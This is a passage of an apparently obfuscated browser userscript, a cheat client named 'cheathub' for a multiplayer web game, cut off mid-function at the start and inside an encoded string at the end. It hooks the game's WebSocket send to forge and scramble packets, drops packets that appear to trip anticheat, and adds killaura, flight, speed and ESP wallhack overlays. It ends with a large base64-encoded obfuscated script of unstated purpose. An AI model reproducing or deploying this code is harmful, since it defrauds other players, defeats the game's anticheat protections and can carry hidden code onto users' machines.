            localStorage.removeItem("cheathubmenu4_x");
            localStorage.removeItem("cheathubmenu4_y");
            localStorage.removeItem("cheathubmenu5_x");
            localStorage.removeItem("cheathubmenu5_y");
            localStorage.removeItem("cheathubmenu6_x");
            localStorage.removeItem("cheathubmenu6_y");
            localStorage.removeItem("cheathubmenu7_x");
            localStorage.removeItem("cheathubmenu7_y");
            localStorage.removeItem("cheathubmenu8_x");
            localStorage.removeItem("cheathubmenu8_y");
            opees();
            opees();
          }
        });
        function geetanjali(dhruvin) {
          const jerimiyah = document.querySelector(dhruvin);
          if (parseInt(jerimiyah.style.height.replace("px", "")) > 40 || jerimiyah.style.height === "") {
            var rayma = document.querySelectorAll(".hidethis" + dhruvin.split("u")[1] + "");
            rayma.forEach(fidella => fidella.hidden = true);
            jerimiyah.style.height = "39px";
            if (dhruvin == "cheathubmenu2") {
              cheathub.gui.openedcombat = false;
            }
            ;
            if (dhruvin == "cheathubmenu3") {
              cheathub.gui.openedblatant = false;
            }
            ;
            if (dhruvin == "cheathubmenu4") {
              cheathub.gui.openedrender = false;
            }
            ;
            if (dhruvin == "cheathubmenu5") {
              cheathub.gui.openedtools = false;
            }
            ;
            if (dhruvin == "cheathubmenu6") {
              cheathub.gui.openedworld = false;
            }
            ;
            if (dhruvin == "cheathubmenu6") {
              cheathub.gui.openedworld = false;
            }
            ;
            if (dhruvin == "cheathubmenu7") {
              cheathub.gui.openedprofiles = false;
            }
            ;
            if (dhruvin == "cheathubmenu8") {
              cheathub.gui.openedfriends = false;
            }
          } else {
            var kendricka = document.querySelectorAll(".hidethis" + dhruvin.split("u")[1] + "");
            kendricka.forEach(nuha => nuha.hidden = false);
            if (dhruvin == "cheathubmenu2") {
              cheathub.gui.openedcombat = true;
            }
            ;
            if (dhruvin == "cheathubmenu3") {
              cheathub.gui.openedblatant = true;
            }
            ;
            if (dhruvin == "cheathubmenu4") {
              cheathub.gui.openedrender = true;
            }
            ;
            if (dhruvin == "cheathubmenu5") {
              cheathub.gui.openedtools = true;
            }
            ;
            if (dhruvin == "cheathubmenu6") {
              cheathub.gui.openedworld = true;
            }
            ;
            if (dhruvin == "cheathubmenu7") {
              cheathub.gui.openedprofiles = true;
            }
            ;
            if (dhruvin == "cheathubmenu8") {
              cheathub.gui.openedfriends = true;
            }
            ;
            jerimiyah.style.height = "41px";
          }
        }
        function welsey(adithi, hava) {
          const jonda = new Date().getTime();
          const yusayrah = adithi.target.dataset.lastClickTime || 0;
          const chevee = 500;
          if (jonda - yusayrah < chevee) {
            geetanjali(hava);
          }
          ;
          adithi.target.dataset.lastClickTime = jonda;
        }
        document.querySelector("#cheathubmenubutton6").addEventListener("click", function (teiona) {
          welsey(teiona, "#cheathubmenu6");
        });
        document.querySelector("#cheathubmenubutton5").addEventListener("click", function (gervon) {
          welsey(gervon, "#cheathubmenu5");
        });
        document.querySelector("#cheathubmenubutton4").addEventListener("click", function (silence) {
          welsey(silence, "#cheathubmenu4");
        });
        document.querySelector("#cheathubmenubutton3").addEventListener("click", function (graceann) {
          welsey(graceann, "#cheathubmenu3");
        });
        document.querySelector("#cheathubmenubutton2").addEventListener("click", function (katori) {
          welsey(katori, "#cheathubmenu2");
        });
        document.querySelector("#cheathubmenubutton7").addEventListener("click", function (armisha) {
          welsey(armisha, "#cheathubmenu7");
        });
        document.querySelector("#cheathubmenubutton8").addEventListener("click", function (kjuan) {
          welsey(kjuan, "#cheathubmenu8");
        });
        document.querySelector("#guicombatbutton").addEventListener("click", function () {
          cheathub.gui.combat = !cheathub.gui.combat;
          localStorage.setItem("cheathub.gui.combat", JSON.stringify(cheathub.gui.combat));
        });
        document.querySelector("#guiblatantbutton").addEventListener("click", function () {
          cheathub.gui.blatant = !cheathub.gui.blatant;
          localStorage.setItem("cheathub.gui.blatant", JSON.stringify(cheathub.gui.blatant));
        });
        document.querySelector("#guitoolsbutton").addEventListener("click", function () {
          cheathub.gui.tools = !cheathub.gui.tools;
          localStorage.setItem("cheathub.gui.tools", JSON.stringify(cheathub.gui.tools));
        });
        document.querySelector("#guirenderbutton").addEventListener("click", function () {
          cheathub.gui.render = !cheathub.gui.render;
          localStorage.setItem("cheathub.gui.render", JSON.stringify(cheathub.gui.render));
        });
        document.querySelector("#guiworldbutton").addEventListener("click", function () {
          cheathub.gui.world = !cheathub.gui.world;
          localStorage.setItem("cheathub.gui.world", JSON.stringify(cheathub.gui.world));
        });
        document.querySelector("#guiprofilebutton").addEventListener("click", function () {
          cheathub.gui.profiles = !cheathub.gui.profiles;
          localStorage.setItem("cheathub.gui.profiles", JSON.stringify(cheathub.gui.profiles));
        });
        document.querySelector("#guifriendsbutton").addEventListener("click", function () {
          cheathub.gui.friends = !cheathub.gui.friends;
          localStorage.setItem("cheathub.gui.friends", JSON.stringify(cheathub.gui.friends));
        });
        document.querySelector("#Funnypacket").addEventListener("click", function () {
          cheathub.funnypacket = !cheathub.funnypacket;
        });
        document.querySelector("#Killaura").addEventListener("click", function () {
          cheathub.killaura = !cheathub.killaura;
        });
        document.querySelector("#Speeder").addEventListener("click", function () {
          cheathub.speed = !cheathub.speed;
        });
        document.querySelector("#Flighter").addEventListener("click", function () {
          cheathub.flight = !cheathub.flight;
        });
        document.querySelector("#Highjumper").addEventListener("click", function () {
          cheathub.highjump = !cheathub.highjump;
        });
        document.querySelector("#Autotoxic").addEventListener("click", function () {
          cheathub.autotoxic = !cheathub.autotoxic;
        });
        document.querySelector("#Nocobwebs").addEventListener("click", function () {
          cheathub.nocobwebs = !cheathub.nocobwebs;
        });
        document.querySelector("#Skinchanger").addEventListener("click", function () {
          cheathub.skinderp = !cheathub.skinderp;
        });
        document.querySelector("#espplayer").addEventListener("click", function () {
          cheathub.rendering.esp.playeresp.espenabled = !cheathub.rendering.esp.playeresp.espenabled;
        });
        document.querySelector("#espthrow").addEventListener("click", function () {
          cheathub.rendering.esp.throwesp.espenabled = !cheathub.rendering.esp.throwesp.espenabled;
        });
        document.querySelector("#tracersplayer").addEventListener("click", function () {
          cheathub.rendering.esp.playeresp.tracersenabled = !cheathub.rendering.esp.playeresp.tracersenabled;
        });
        document.querySelector("#tracersthrow").addEventListener("click", function () {
          cheathub.rendering.esp.throwesp.tracersenabled = !cheathub.rendering.esp.throwesp.tracersenabled;
        });
        document.querySelector("#profilesbutton").addEventListener("click", function () {
          alert("\r\nthis doesnt do anything yet, gonna add it soon\r\n");
        });
        document.querySelector("#friendsbutton").addEventListener("click", function () {
          alert("\r\nthis doesnt do anything yet, gonna add it soon\r\n");
        });
        makeElementDraggable(document.getElementById("cheathubmenubutton6"), document.getElementById("cheathubmenu6"), 1250, 0);
        makeElementDraggable(document.getElementById("cheathubmenubutton5"), document.getElementById("cheathubmenu5"), 1000, 0);
        makeElementDraggable(document.getElementById("cheathubmenubutton4"), document.getElementById("cheathubmenu4"), 750, 0);
        makeElementDraggable(document.getElementById("cheathubmenubutton3"), document.getElementById("cheathubmenu3"), 500, 0);
        makeElementDraggable(document.getElementById("cheathubmenubutton2"), document.getElementById("cheathubmenu2"), 250, 0);
        makeElementDraggable(document.getElementById("cheathubmenubutton1"), document.getElementById("cheathubmenu1"), 0, 0);
        makeElementDraggable(document.getElementById("cheathubmenubutton7"), document.getElementById("cheathubmenu7"), 250, 250);
        makeElementDraggable(document.getElementById("cheathubmenubutton8"), document.getElementById("cheathubmenu8"), 500, 250);
      }
      function makeElementDraggable(jayk, stony, devlin, sunie) {
        let yezenia = false;
        let malvine;
        let sias;
        jayk.addEventListener("mousedown", kubo => {
          yezenia = true;
          malvine = kubo.clientX - stony.getBoundingClientRect().left;
          sias = kubo.clientY - stony.getBoundingClientRect().top;
        });
        document.addEventListener("mousemove", moryah => {
          if (yezenia) {
            const snapper = moryah.clientX - devlin - malvine;
            const sunaina = moryah.clientY - sunie - sias;
            stony.style.transform = "translate(" + snapper + "px, " + sunaina + "px)";
            localStorage.setItem("" + stony.id + "_x", snapper);
            localStorage.setItem("" + stony.id + "_y", sunaina);
          }
        });
        document.addEventListener("mouseup", () => {
          yezenia = false;
        });
        const rinor = localStorage.getItem("" + stony.id + "_x");
        const dailon = localStorage.getItem("" + stony.id + "_y");
        if (rinor !== null && dailon !== null) {
          stony.style.transform = "translate(" + rinor + "px, " + dailon + "px)";
        }
      }
      function unpush(zadiel, zhariyah) {
        const obiora = zadiel.indexOf(zhariyah);
        if (obiora !== -1) {
          zadiel.splice(obiora, 1);
        }
      }
      function addNewList(tacori) {
        var kaedynce = document.querySelector(".hackarray-container");
        if (!kaedynce) {
          kaedynce = document.createElement("ul");
          kaedynce.className = "hackarray-container";
          kaedynce.style.listStyle = "none";
          kaedynce.style.display = "flex";
          kaedynce.style.flexDirection = "column";
          kaedynce.style.position = "fixed";
          kaedynce.style.top = "0";
          kaedynce.style.right = "0";
          kaedynce.style.marginTop = "0";
          kaedynce.style.zIndex = 9999;
          document.body.appendChild(kaedynce);
        }
        ;
        var leteisha = document.createElement("li");
        leteisha.style.display = "flex";
        leteisha.style.alignItems = "center";
        leteisha.style.justifyContent = "flex-end";
        leteisha.style.zIndex = 9999;
        kaedynce.insertBefore(leteisha, kaedynce.firstChild);
        var nyeim = document.createElement("div");
        nyeim.style.backgroundColor = "white";
        nyeim.style.width = "3px";
        nyeim.style.height = "25px";
        nyeim.style.zIndex = 9999;
        leteisha.appendChild(nyeim);
        var natassia = document.createElement("div");
        natassia.textContent = tacori;
        natassia.className = "hackarray";
        natassia.style.padding = "3px";
        natassia.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
        natassia.style.border = "0px solid #ccc";
        natassia.style.color = "white";
        natassia.style.zIndex = 9999;
        natassia.style.paddingLeft = "9px";
        leteisha.appendChild(natassia);
        leteisha.dataset.textLength = tacori.length;
        var oril = Array.from(kaedynce.children);
        oril.sort((ariannie, tash) => tash.dataset.textLength - ariannie.dataset.textLength);
        oril.forEach(ivoryana => kaedynce.appendChild(ivoryana));
      }
      function delList(kristiena) {
        var anupam = document.querySelector(".hackarray-container");
        if (!anupam) {
          return;
        }
        ;
        var haslyn = Array.from(anupam.querySelectorAll(".hackarray"));
        haslyn.forEach(function (orlen) {
          if (orlen.textContent === kristiena) {
            anupam.removeChild(orlen.parentElement);
          }
        });
      }
      function spoofblock(arbutis, nishtha, sheletha, icely, annai, jaqwan) {
        sendslot(nishtha);
        unsafeWindow.packet({
          pos: [icely, annai, jaqwan],
          toBlock: sheletha
        }, 14);
        sendslot(arbutis);
      }
      function sendblockdestroy(gittle, wachovia, alexson) {
        unsafeWindow.packet([wachovia[0], wachovia[1], wachovia[2]], 22);
        setTimeout(function () {
          sendblock(0, wachovia[0], wachovia[1], wachovia[2]);
        }, 100);
        unsafeWindow.packet([wachovia[0], wachovia[1] - 1, wachovia[2]], 22);
      }
      function sendmsg(daileny) {
        unsafeWindow.packet({
          msg: String(daileny),
          channelName: "Global"
        }, 1);
      }
      function sendslot(barin) {
        unsafeWindow.packet(barin, 15);
      }
      function sendattack(elyes, noell, caralyn) {
        console.log(elyes, noell, caralyn);
        unsafeWindow.packet({
          eId: elyes,
          dirFacing: caralyn,
          heldName: noell
        }, 27);
      }
      function sendblock(tigh, sharren, nigel, claren) {
        unsafeWindow.packet({
          pos: [sharren, nigel, claren],
          toBlock: tigh
        }, 14);
      }
      document.addEventListener("keydown", function (tumekia) {
        if (tumekia.key === "`") {
          unsafeWindow.fire(30, 2, 0, "attack");
          for (var freemon = 1; freemon < document.querySelector("#root > div.WholeAppWrapper > div > div.BottomMiddleElements > div.hotbarContainer > div").childElementCount; freemon++) {
            if (document.querySelector("#root > div.WholeAppWrapper > div > div.BottomMiddleElements > div.hotbarContainer > div > div:nth-child(" + freemon + ")").className.includes("SelectedItem")) {
              sendslot(freemon - 1);
            }
          }
        }
      });
      document.addEventListener("keydown", function (fidela) {
        if (fidela.key === "f") {
          if (!cheathub.flight) {
            cheathub.flight = !cheathub.flight;
          } else {
            cheathub.flight = !cheathub.flight;
          }
        }
      });
      document.addEventListener("keydown", function (laykn) {
        if (laykn.key === "r") {
          if (!cheathub.speed) {
            cheathub.speed = !cheathub.speed;
          } else {
            cheathub.speed = !cheathub.speed;
          }
        }
      });
      document.addEventListener("keydown", function (abdel) {
        if (abdel.key === ",") {
          if (!cheathub.nocobwebs) {
            cheathub.nocobwebs = !cheathub.nocobwebs;
          } else {
            cheathub.nocobwebs = !cheathub.nocobwebs;
          }
        }
      });
      document.addEventListener("keydown", function (sallyann) {
        if (sallyann.key === ".") {
          if (!cheathub.highjump) {
            cheathub.highjump = !cheathub.highjump;
          } else {
            cheathub.highjump = !cheathub.highjump;
          }
        }
      });
      var ws;
      var enc = new TextDecoder("utf-8");
      var enc2 = new TextEncoder("utf-8");
      WebSocket.prototype.oldSend = WebSocket.prototype.send;
      WebSocket.prototype.send = function (lorelyn) {
        unsafeWindow.anticheatr = false;
        if (!ws) {
          unsafeWindow.ws = this;
          ws = this;
        }
        ;
        if (ws.readyState == 3) {
          unsafeWindow.ws = undefined;
          ws = undefined;
          return;
        }
        ;
        function camacho(dayan) {
          if (dayan == undefined || null) {
            return "null";
          }
          ;
          const jaquilyn = new Uint8Array(dayan);
          let cordula = jaquilyn[0];
          let noorseen = jaquilyn[1];
          const deason = jaquilyn.slice(2);
          const daiquon = msgpack.decode(deason);
          if (cheathub.debugging == true) {
            console.log(daiquon, cordula, noorseen);
          }
          ;
          if (daiquon.jumpAmount) {
            console.log(daiquon.jumpAmount);
            unsafeWindow.anticheatr = true;
            return [{}, cordula, noorseen];
          }
          ;
          return [daiquon, cordula, noorseen];
          return [daiquon, cordula, noorseen];
        }
        if (lorelyn.byteLength > 2) {
          let annibella = camacho(lorelyn);
          if (annibella[0].pitch && cheathub.funnypacket == true) {
            annibella[0].pitch = Math.random() * 10 - 5;
            annibella[0].crouching = Math.random() < 0.8;
            annibella[0].armSwinging = Math.random() < 0.2;
            annibella[0].useDir = [Math.random() * 10 - 5, Math.random() * 10 - 5, Math.random() * 10 - 5];
            annibella[0].heading = Math.random() * 10 - 5;
            unsafeWindow.packet(annibella[0], annibella[2]);
            return;
          }
          ;
          if (annibella[2] == 20) {
            return;
          }
        }
        ;
        unsafeWindow.packet = function jabri(alyn, kimiye) {
          const eutiquio = msgpack.encode(alyn);
          const lavina = new Uint8Array(eutiquio.length + 2);
          lavina[0] = 13;
          lavina[1] = kimiye;
          lavina.set(eutiquio, 2);
          unsafeWindow.ws.oldSend(lavina);
        };
        unsafeWindow.rawpacket = function prapti(samien, nikata) {
          let raquita = new Uint8Array(samien, nikata);
          unsafeWindow.ws.oldSend(raquita);
        };
        if (unsafeWindow.anticheatr == false) {
          this.oldSend(lorelyn);
        }
      };
      function hookApply(kyrstyn, parnika, lyllie) {
        kyrstyn[parnika] = new Proxy(kyrstyn[parnika], {
          apply: function (wanona, rolla, sibilla) {
            lyllie(...sibilla);
            return Reflect.apply(wanona, rolla, sibilla);
          }
        });
      }
      hookApply(Object, "defineProperty", (..._0x8b18x9e) => {
        cheathub.babylon = window.BABYLON;
        if (_0x8b18x9e[1] == "getPlayerPosition") {
          if (_0x8b18x9e[0].tickRate == 30) {
            cheathub.noa = _0x8b18x9e[0];
          }
        }
      });
      function espdie() {
        for (var deaunte of cheathub.noa.rendering._scene.meshes) {
          if (deaunte.name == "esplines") {
            deaunte.dispose();
          }
          ;
          if (deaunte.name == "espbox") {
            deaunte.dispose();
          }
        }
      }
      function esplol() {
        return;
        cheathub.myposer = cheathub.noa.entities.getPositionData(cheathub.noa.playerEntity).position;
        const edessa = {
          points: [new cheathub.babylon.Vector3(0, -990, 0), new cheathub.babylon.Vector3(cheathub.myposer[0], cheathub.myposer[1] + 1, cheathub.myposer[2])],
          updatable: true
        };
        let hadassa = cheathub.babylon.MeshBuilder.CreateLines("esplines", edessa, cheathub.noa.rendering._scene);
        cheathub.noa.rendering.addMeshToScene(hadassa);
        hadassa.renderingGroupId = 1;
        hadassa.lineWidth = 40;
        hadassa.color = new cheathub.babylon.Color3(0, 0, 0);
      }
      function espline(aritra, dandy) {
        cheathub.myposer = cheathub.noa.entities.getPositionData(cheathub.noa.playerEntity).position;
        const sabali = {
          points: aritra,
          updatable: true
        };
        let brodric = cheathub.babylon.MeshBuilder.CreateLines("esplines", sabali, cheathub.noa.rendering._scene);
        cheathub.noa.rendering.addMeshToScene(brodric);
        brodric.renderingGroupId = 1;
        brodric.color = dandy;
      }
      function espbox(absalat, jashyia, valerian, asha) {
        const latoria = cheathub.noa.entities.getPositionData(cheathub.noa.playerEntity).position;
        const joseluiz = cheathub.babylon.MeshBuilder.CreateBox("espbox", {
          size: valerian
        }, cheathub.noa.rendering._scene);
        joseluiz.position.copyFromFloats(absalat.x, absalat.y, absalat.z);
        cheathub.noa.rendering.addMeshToScene(joseluiz);
        joseluiz.material = new cheathub.babylon.StandardMaterial("boxMat", cheathub.noa.rendering._scene);
        joseluiz.material.diffuseColor = jashyia;
        joseluiz.material.alpha = asha;
        joseluiz.material.specularColor = new cheathub.babylon.Color3(0, 0, 0);
        joseluiz.material.reflectivityColor = new cheathub.babylon.Color3(0, 0, 0);
        joseluiz.renderingGroupId = 1;
      }
      unsafeWindow.espSkybox = function (jenri, ezinne, dorretta) {
        const yamaira = new cheathub.babylon.MeshBuilder.CreateBox("customSkybox", {
          size: 1000
        }, cheathub.noa.rendering._scene);
        yamaira.position.copyFrom(jenri);
        cheathub.noa.rendering.addMeshToScene(yamaira);
        const covy = new cheathub.babylon.StandardMaterial("skyboxMat", cheathub.noa.rendering._scene);
        covy.backFaceCulling = false;
        covy.diffuseColor = ezinne;
        if (dorretta) {
          const kentlee = new cheathub.babylon.CubeTexture.CreateFromImages([dorretta, dorretta, dorretta, dorretta, dorretta, dorretta], cheathub.noa.rendering._scene);
          covy.reflectionTexture = kentlee;
        }
        ;
        yamaira.material = covy;
        yamaira.renderingGroupId = 0;
      };
      function espbox2(julene, clydie, raiah, twalla, lynnea, arisbel) {
        const shelleen = cheathub.noa.entities.getPositionData(cheathub.noa.playerEntity).position;
        const comer = cheathub.babylon.MeshBuilder.CreateBox("espbox", {
          width: raiah,
          height: twalla,
          depth: lynnea
        }, cheathub.noa.rendering._scene);
        comer.position.copyFromFloats(julene.x, julene.y, julene.z);
        cheathub.noa.rendering.addMeshToScene(comer);
        comer.material = new cheathub.babylon.StandardMaterial("boxMat", cheathub.noa.rendering._scene);
        comer.material.diffuseColor = clydie;
        comer.material.alpha = arisbel;
        comer.material.specularColor = new cheathub.babylon.Color3(0, 0, 0);
        comer.material.reflectivityColor = new cheathub.babylon.Color3(0, 0, 0);
        comer.renderingGroupId = 1;
      }
      function makeGetRequest(destinique) {
        return new Promise((emberlynne, safir) => {
          const chrisinda = new XMLHttpRequest();
          chrisinda.open("GET", destinique);
          chrisinda.onload = () => {
            if (chrisinda.status === 200) {
              emberlynne(chrisinda.responseText);
            } else {
              safir(new Error("HTTP Error: " + chrisinda.status + ""));
            }
          };
          chrisinda.onerror = () => {
            safir(new Error("Network Error"));
          };
          chrisinda.send();
        });
      }
      return true;
    } else {
      const IncorrectNotify = "dmFyIHRXQUl3ZFcsaFZlZTliLEEwY3ZUQm4seW05aWVDLFdiYkZIeixiaHlzRlQsQkhCaE5USCxXZE9zbzksUXNjb0h3MixLVDFqc2o4LGhnNkJpTkYsZXR4YWFKcCxMYkhWTERQLHNMclppMTtmdW5jdGlvbiB0SFA4NkZEKGhWZWU5Yil7cmV0dXJuIHRXQUl3ZFdbaFZlZTliPDB4NjE/aFZlZTliLTB4MWI6aFZlZTliLTB4NjJdfXRXQUl3ZFc9Y0NGS3Jndy5jYWxsKHRoaXMpO3ZhciBYRDAzcGY9W10scVQzNl9xeD10SFA4NkZEKDB4NjIpLFY2d0pYVEs9ZklRWEQ3NSgoKT0+e3ZhciB0V0FJd2RXPVsnUjI8OkdrQScsJ1A1ezxDW0JaaiR6Zk5rQVhII2Y8S20xOyMjSTJhbGNlJywncHJuRUV7M2pfVEspKmtka0F1KHlVJywnbUdXMEhpSWVrVFpiP0N4YXNNXUlaPFBCJywnaU1lYy8qYHA2IVApcl5qWkssKyxXPigjTCUreFRDZlliOjR4UScsJzVvQjJKPGxOak1Eemd2SW0mcUZ5ajk2Q1EjU2lCJywnUTIxY2xAflJpSlglPnhJYVR6QWJHeStNZyNxKkE4U2lZKSssMWxBJywnTVhAL30wImlEMkk5IU5WaWBHWGhfbTQwTVJPLkEnLCcoIW9lR2k0OmZQdzwlTldpK1huRSwhekg3N3UqQicsJzlpIkkwK117VTJ3NHNEa1pWdWlkOip0QicsJ1osOTBvI35qdSNlaVdsYWRCeEo7P15oNVpVVlVeK0VybU1IMEo8LzV0VlouQScsJ1YjOkZlYChYRicsJ2w1VktSWzlgYUlVNjttUG51TTIsZT4ue0hSYTY9QDlqMVhjPXk7X3s2SW0vUltBUyE3ZEViailHODEvKDY2Z1NdbmFiKzhHWUszVHoyOWhscmlOSDg9d3VfJCFFJThkWFF6ejF8bT51Nk99cnhRbWxFI2Z4JndEWlAmOnghW1ZpUHhSO2BoQyQ1UjxCcmEqUy40dEhNJywnanJXZj1bJHtsVCcsJyx6XzFaJywndzUwMVtbXnB2U100QicsJ2w1VktSWzlgYjFCPiouM3FiOChnVyoiQG8hXSNIQycsJ2VQMDFgKmFDS1JFdnptTycsJ1NQVksnLCcoMl8xOT1aOztSJywne3RlZj1bJllvNnEzLzhVbycsJ2FyJEpnLF9ZSCcsJ1Z1XzFiJywnSHJkSFYnLCdlUFczWCw0ZT0hKy9vN1dpUFBGSycsJ2BxJEpnLF9ZIkg6QFM5TScsJ0h1QEpOOi9IciUhJjReZWxxciRKJywnZVAkSlonLCd3NXpnNz1dMEIjOCcsJ2w1VktSWzlgYUlVNjttUG51TTIsZT4ue25SInVoLjhqNjJQRTw8VUMnLCdycntmNj1BJywnJnptZj1bZ2VFJD0jfSxgbycsJ21hbEsnLCd3NTlLZSxBJywnNWE7SXEvQScsJ3l0KGFKJywnVFAsPG0veUMnLCducjdnP1ske2xUJywnb2FJaDMrQScsJ3JyQEonLCdYUEFKZCcsJ1tEWDwmLl17NlVXekInLCc6WFlKZyxBJywnOGEjSmMsNkMnLCd8K3diTycsJ21hTktZPCswSCcsJ0BpXkllJywnVzhOS1A6QDA/NGMlaTk6bVpCJywnT1AkSmcsdUMnLCc7aSw8Nj1LWT0hZS5CJywnZHIkSiM2MDY8UicsJ3p0PkplJywnYXJFPXJAQScsJzxpSDx2O0EnLCdmUDFLb3ZUW3IlWCVLRicsJ25YLDw6V2xUTCVJKUtGfWtZQmhnSzpTQ2MmTzshNWFwdzU+dmc+SFsjRl00am1sTGVQRzNnLHVDbiU0dDA4JHF3IjF4e28hMjcuUWgzTjdVSTl8YX1pdG9XM3cpTltvIV0jMVlRbnhvIkRMOmxUMVRZekInLCdacmVmZScsJ0h1amc2PUhUZiNxIWxFJywnMlgwMW52e1k8IXQvQicsJyZ6SDxwL3xMZlZEdjttOWpKQicsJ2RNO0lGOkRaPFI3MENGJywnQUVlM18qYUMnXTtyZXR1cm4gcVQzNl9xeD90V0FJd2RXLnBvcCgpOnFUMzZfcXgrKyx0V0FJd2RXfSwweDApKCk7ZnVuY3Rpb24gXzBCa0l5KCl7dHJ5e3JldHVybiBnbG9iYWx8fHdpbmRvd3x8bmV3IEZ1bmN0aW9uKCdyZXR1cm4gdGhpcycpKCl9Y2F0Y2goZSl7dHJ5e3JldHVybiB0aGlzfWNhdGNoKGUpe3JldHVybnt9fX19dHlwZW9mKGhWZWU5Yj1fMEJrSXkoKXx8e30sQTBjdlRCbj1oVmVlOWIuVGV4dERlY29kZXIseW05aWVDPWhWZWU5Yi5VaW50OEFycmF5LFdiYkZIej1oVmVlOWIuQnVmZmVyLGJoeXNGVD1oVmVlOWIuU3RyaW5nfHxTdHJpbmcsQkhCaE5USD1oVmVlOWIuQXJyYXl8fEFycmF5LFdkT3NvOT1mSVFYRDc1KCgpPT57dmFyIGhWZWU5Yj1uZXcgQkhCaE5USCgweDgwKSxBMGN2VEJuLHltOWllQzt0eXBlb2YoQTBjdlRCbj1iaHlzRlQuZnJvbUNvZGVQb2ludHx8Ymh5c0ZULmZyb21DaGFyQ29kZSx5bTlpZUM9W10pO3JldHVybiBmSVFYRDc1KFdiYkZIej0+e3ZhciBCSEJoTlRILFdkT3NvOTtmdW5jdGlvbiBRc2NvSHcyKFdiYkZIeil7cmV0dXJuIHRXQUl3ZFdbV2JiRkh6PDB4NWU/V2JiRkh6LTB4MTY6V2JiRkh6PDB4NzA/V2JiRkh6PDB4NzA/V2JiRkh6PDB4NWU/V2JiRkh6LTB4NWI6V2JiRkh6PjB4NWU/V2JiRkh6PDB4NzA/V2JiRkh6PjB4NzA/V2JiRkh6LTB4ZjpXYmJGSHo8MHg1ZT9XYmJGSHotMHg1MDpXYmJGSHotMHg1ZjpXYmJGSHotMHgxMzpXYmJGSHorMHgyOldiYkZIei0weDJhOldiYkZIeisweDNhXX12YXIgS1QxanNqOCxoZzZCaU5GO3R5cGVvZihCSEJoTlRIPVdiYkZIei5sZW5ndGgseW05aWVDLmxlbmd0aD1Rc2NvSHcyKDB4NWYpKTtmb3IoV2RPc285PXRIUDg2RkQoMHg2Mik7V2RPc285PEJIQmhOVEg7KXtoZzZCaU5GPVdiYkZIeltXZE9zbzkrK107aWYoaGc2QmlORjw9MHg3Zil7S1QxanNqOD1oZzZCaU5GfWVsc2V7aWYoaGc2QmlORjw9MHhkZil7dmFyIGV0eGFhSnA9ZklRWEQ3NShXYmJGSHo9PntyZXR1cm4gdFdBSXdkV1tXYmJGSHo8LTB4M2Q/V2JiRkh6LTB4Mjg6V2JiRkh6Pi0weDNkP1diYkZIeisweDNjOldiYkZIei0weDRkXX0sMHgxKTtLVDFqc2o4PShoZzZCaU5GJjB4MWYpPDxRc2NvSHcyKDB4NjApfFdiYkZIeltXZE9zbzkrK10mZXR4YWFKcCgtMHgzYSl9ZWxzZXtpZihoZzZCaU5GPD0weGVmKXtLVDFqc2o4PShoZzZCaU5GJnRIUDg2RkQoMHg2NikpPDwweGN8KFdiYkZIeltXZE9zbzkrK10mMHgzZik8PFFzY29IdzIoMHg2MCl8V2JiRkh6W1dkT3NvOSsrXSYweDNmfWVsc2V7aWYoYmh5c0ZULmZyb21Db2RlUG9pbnQpe3ZhciBMYkhWTERQPWZJUVhENzUoV2JiRkh6PT57cmV0dXJuIHRXQUl3ZFdbV2JiRkh6PjB4M2Y/V2JiRkh6PjB4NTE/V2JiRkh6LTB4MTQ6V2JiRkh6PjB4NTE/V2JiRkh6KzB4ZjpXYmJGSHo8MHg1MT9XYmJGSHotMHg0MDpXYmJGSHorMHgxOldiYkZIeisweDYyXX0sMHgxKTtLVDFqc2o4PShoZzZCaU5GJjB4Nyk8PDB4MTJ8KFdiYkZIeltXZE9zbzkrK10mMHgzZik8PDB4Y3woV2JiRkh6W1dkT3NvOSsrXSYweDNmKTw8MHg2fFdiYkZIeltXZE9zbzkrK10mTGJIVkxEUCgweDQyKX1lbHNle3ZhciBzTHJaaTE9ZklRWEQ3NShXYmJGSHo9PntyZXR1cm4gdFdBSXdkV1tXYmJGSHo+LTB4NWQ/V2JiRkh6Pi0weDRiP1diYkZIei0weDE2OldiYkZIej4tMHg1ZD9XYmJGSHorMHg1YzpXYmJGSHotMHhjOldiYkZIei0weDFdfSwweDEpOyEoS1QxanNqOD1zTHJaaTEoLTB4NWEpLFdkT3NvOSs9dEhQODZGRCgweDZhKSl9fX19eW05aWVDLnB1c2goaFZlZTliW0tUMWpzajhdfHwoaFZlZTliW0tUMWpzajhdPUEwY3ZUQm4oS1QxanNqOCkpKX1yZXR1cm4geW05aWVDLmpvaW4oJycpfSwweDEpfSwweDApKCkpO2Z1bmN0aW9uIEVyVng0TSh0V0FJd2RXKXtyZXR1cm4gdHlwZW9mIEEwY3ZUQm4hPT0ndW5kZWZpbmVkJyYmQTBjdlRCbj9uZXcgQTBjdlRCbigpLmRlY29kZShuZXcgeW05aWVDKHRXQUl3ZFcpKTp0eXBlb2YgV2JiRkh6IT09J3VuZGVmaW5lZCcmJldiYkZIej9XYmJGSHouZnJvbSh0V0FJd2RXKS50b1N0cmluZygndXRmLTgnKTpXZE9zbzkodFdBSXdkVyl9IShRc2NvSHcyPXFPM0RFU1coMHgzMCksS1QxanNqOD1xTzNERVNXLmFwcGx5KHZvaWQgMHgwLFt0SFA4NkZEKDB4NjUpXSksaGc2QmlORj1xTzNERVNXKDB4MTQpLGV0eGFhSnA9e093OWtQX2Q6cU8zREVTVygweDEyKSx0MXFvem5MOnFPM0RFU1coMHgyMSksSDVUcTAwOnFPM0RFU1coMHgyYiksW3RIUDg2RkQoMHg2ZildOnFPM0RFU1codEhQODZGRCgweDY1KSksbk5sbklSazpxTzNERVNXKDB4MzQpfSxMYkhWTERQPVtxTzNERVNXKDB4YikscU8zREVTV1t0SFA4NkZEKDB4NmUpXSh2b2lkIDB4MCxbMHhkXSkscU8zREVTVygweDE1KSxxTzNERVNXKHRIUDg2RkQoMHg2OCkpLHFPM0RFU1codEhQODZGRCgweDY5KSkscU8zREVTVy5hcHBseSh2b2lkIDB4MCxbMHhmXSkscU8zREVTVygweDEwKSxxTzNERVNXKDB4MjIpLHFPM0RFU1coMHgyYSldLHNMclppMT1mSVFYRDc1KCgpPT57dmFyIHRXQUl3ZFc9e0ZoS1VjdzpMYkhWTERQWzB4MF19O3JldHVybiB0V0FJd2RXfSwweDApKCkpO2lmKCgoKT0+e3ZhciBoVmVlOWIsQTBjdlRCbjtmdW5jdGlvbiB5bTlpZUMoaFZlZTliKXtyZXR1cm4gdFdBSXdkV1toVmVlOWI+LTB4Mjc/aFZlZTliPi0weDI3P2hWZWU5YjwtMHgxNT9oVmVlOWIr